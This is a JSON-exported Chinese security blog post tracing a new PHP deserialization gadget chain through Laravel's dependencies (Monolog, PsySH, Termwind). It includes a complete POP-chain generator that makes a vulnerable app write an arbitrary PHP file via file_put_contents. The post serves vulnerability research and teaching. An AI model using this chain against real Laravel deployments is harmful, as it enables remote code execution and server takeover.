{"title":"laravel 新链挖掘","uid":"dd03dedaa9adf58cb69c42c6e6d91aa7","slug":"laravel-新链挖掘","date":"2024-06-22T07:31:46.000Z","updated":"2024-06-22T07:57:42.469Z","comments":true,"path":"api/articles/laravel-新链挖掘.json","keywords":null,"cover":[],"content":"<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><pre class=\"line-numbers language-none\"><code class=\"language-none\">composer create-project laravel&#x2F;laravel laravel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>拉下来之后我们即可在<code>laravel</code> 目录中看到。在<code>routes/web.php</code>中创建一条反序列化路由即可。</p>\n<h1 id=\"挖掘过程\"><a href=\"#挖掘过程\" class=\"headerlink\" title=\"挖掘过程\"></a>挖掘过程</h1><p>（1）首先寻找<code>__destruct</code> 函数，这里追踪到<code>Monolog\\Handler\\Handler</code> 中，首先看到他是一个抽象类，抽象类中定义了<code>__destruct</code> 子类如果没有重写的话，是会直接调用到父类的<code>__destruct</code>函数。在<code>__destruct</code>中调用了<code>close</code>方法，如下图所示，我们只需要找一个重写了<code>close</code>方法，而没有重写<code>__destruct</code>方法的子类即可（<code>groupHandler</code>是一个很好的选择）</p>\n<h3 id=\"Monolog-Handler-Handler\"><a href=\"#Monolog-Handler-Handler\" class=\"headerlink\" title=\"Monolog\\Handler\\Handler\"></a>Monolog\\Handler\\Handler</h3><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20240622153830394.png\" alt=\"image-20240622153830394\"></p>\n<h3 id=\"Monolog-Handler-GroupHandler\"><a href=\"#Monolog-Handler-GroupHandler\" class=\"headerlink\" title=\"Monolog\\Handler\\GroupHandler\"></a>Monolog\\Handler\\GroupHandler</h3><p>在<code>groupHandler</code>的<code>close</code>方法中，将handlers进行了遍历执行close方法，所以根据close方法继续找即可。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20240622154123217.png\" alt=\"image-20240622154123217\"></p>\n<h3 id=\"Psy-Readline-Hoa-Stream\"><a href=\"#Psy-Readline-Hoa-Stream\" class=\"headerlink\" title=\"Psy\\Readline\\Hoa\\Stream\"></a>Psy\\Readline\\Hoa\\Stream</h3><p>找到了<code>close</code> 方法，先调用了<code>getStreamName</code>方法，然后进行了md5函数，所以只需要找一个<code>__tostring</code>触发。而<code>Stream</code>是一个抽象类，找实现类即可。随便去选择一个 我选择 <code>Psy\\Readline\\Hoa\\FileRead</code>。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20240622154541487.png\" alt=\"image-20240622154541487\"></p>\n<h3 id=\"Termwind-Components-Element\"><a href=\"#Termwind-Components-Element\" class=\"headerlink\" title=\"Termwind\\Components\\Element\"></a>Termwind\\Components\\Element</h3><p>因为<code>__tostring</code>函数调用了<code>tostring</code>函数，所以直接看<code>tostring</code>函数，这里调用了<code>$this-&gt;stypes-&gt;format</code>函数，所以直接找format函数即可。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20240622155322856.png\" alt=\"image-20240622155322856\"></p>\n<h3 id=\"Termwind-ValueObjects-Styles\"><a href=\"#Termwind-ValueObjects-Styles\" class=\"headerlink\" title=\"Termwind\\ValueObjects\\Styles\"></a>Termwind\\ValueObjects\\Styles</h3><p>即可实现命令执行。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20240622155654539.png\" alt=\"image-20240622155654539\"></p>\n<h2 id=\"POP-chain\"><a href=\"#POP-chain\" class=\"headerlink\" title=\"POP chain\"></a>POP chain</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\nnamespace Monolog\\Handler&#123;\n    class GroupHandler &#123;\n        protected array $handlers;\n\n        public function __construct($oa)&#123;\n            $this-&gt;handlers[0]&#x3D;$oa;\n        &#125;\n    &#125;\n&#125;\nnamespace Psy\\Readline\\Hoa&#123;\n    class FileRead&#123;\n        protected $_bucket &#x3D; [];\n        public function __construct($oa)&#123;\n            $this-&gt;_bucket[0]&#x3D;$oa;\n            $this-&gt;_bucket[2]&#x3D;$oa;\n        &#125;\n    &#125;\n&#125;\nnamespace Termwind\\Components&#123;\n    use Termwind\\ValueObjects\\Styles;\n    final class Hr extends Element&#123;\n        public function __construct($oa)&#123;\n            $this-&gt;styles &#x3D; $oa;\n            $this-&gt;content &#x3D; &quot;testtestest.php&quot;;\n        &#125;\n    &#125;\n    abstract class Element\n    &#123;\n    protected static array $defaultStyles &#x3D; [];\n    protected Styles $styles;\n    protected array|string $content;\n&#125;\n&#125;\n\nnamespace Termwind\\ValueObjects&#123;\n    final class Styles&#123;\n        private array $textModifiers &#x3D; [&#39;file_put_contents&#39;];\n        private array $properties &#x3D; [\n            &#39;styles&#39; &#x3D;&gt; &quot;&lt;?php phpinfo();&quot;,\n            &#39;parentStyles&#39; &#x3D;&gt; 0,\n        ];\n    &#125;\n&#125;\n\n\nnamespace&#123;\n    $styles &#x3D; new Termwind\\ValueObjects\\Styles;\n    $hr &#x3D; new Termwind\\Components\\Hr($styles);\n    $o2 &#x3D; new Psy\\Readline\\Hoa\\FileRead($hr);\n    $o3 &#x3D; new Monolog\\Handler\\GroupHandler($o2);\n    echo urlencode(serialize($o3));\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"环境composer create-project laravel&#x2F;laravel laravel 拉下来之后我们即可在laravel 目录中看到。在routes/web.php中创建一条反序列化路由即可。 挖掘过程（1）首先寻找__destruct 函数，这里追踪到M...","link":"","photos":[],"count_time":{"symbolsCount":"2.3k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":1,"path":"api/tags/漏洞挖掘.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">环境</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">挖掘过程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Monolog-Handler-Handler\"><span class=\"toc-text\">Monolog\\Handler\\Handler</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Monolog-Handler-GroupHandler\"><span class=\"toc-text\">Monolog\\Handler\\GroupHandler</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Psy-Readline-Hoa-Stream\"><span class=\"toc-text\">Psy\\Readline\\Hoa\\Stream</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Termwind-Components-Element\"><span class=\"toc-text\">Termwind\\Components\\Element</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Termwind-ValueObjects-Styles\"><span class=\"toc-text\">Termwind\\ValueObjects\\Styles</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POP-chain\"><span class=\"toc-text\">POP chain</span></a></li></ol></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"nacos 漏洞分析","uid":"e40a9f40d03bd2b693c032e976c8f9fc","slug":"nacos-漏洞分析","date":"2024-07-21T08:24:22.000Z","updated":"2024-07-21T13:41:26.998Z","comments":true,"path":"api/articles/nacos-漏洞分析.json","keywords":null,"cover":[],"text":"nacos 漏洞分析https:&#x2F;&#x2F;github.com&#x2F;foyaga&#x2F;blog-timeline&#x2F;issues&#x2F;328 根据issue，我们跟踪到路由。看到有配置secured注解，是需要nacos或者admin权限的...","link":"","photos":[],"count_time":{"symbolsCount":811,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":5,"path":"api/tags/JAVA安全.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"java-RMI总结","uid":"6005eed39119dccf7e919200eaee24eb","slug":"java-RMI总结","date":"2023-11-12T15:47:53.000Z","updated":"2023-11-13T15:28:47.283Z","comments":true,"path":"api/articles/java-RMI总结.json","keywords":null,"cover":[],"text":"RMI基础是什么？RMI是远程方法调用，是基于注册中心和服务来进行实现的，是非常类似于GO中的RPC，都可以用来做微服务。 如何用？ 定义接口继承Remote 其中的方法都需要throws RemoteException 实现类继承UnicastRemoteObject类实现接口...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":5,"path":"api/tags/JAVA安全.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true}}